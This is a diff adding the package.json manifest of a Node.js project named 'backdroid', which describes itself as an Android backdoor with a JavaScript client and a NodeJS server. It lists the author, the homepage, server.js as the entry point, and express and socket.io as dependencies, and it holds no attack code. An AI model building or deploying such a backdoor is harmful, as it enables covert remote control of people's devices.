@@ -1,0 +1,14 @@
+{
+	
+	"name": "backdroid",
+	"version": "1.0.0",
+	"author": "yeikos",
+	"description": "it's a backdoor for Android formed by a client written in JavaScript, with the help of http://onx.ms/, and a server written in NodeJS.",
+	"homepage": "https://github.com/yeikos/backdroid",
+	"main": "server.js",
+	"dependencies": {
+		"express": "2.5.x",
+		"socket.io": "0.9.x"
+	}
+	
+}
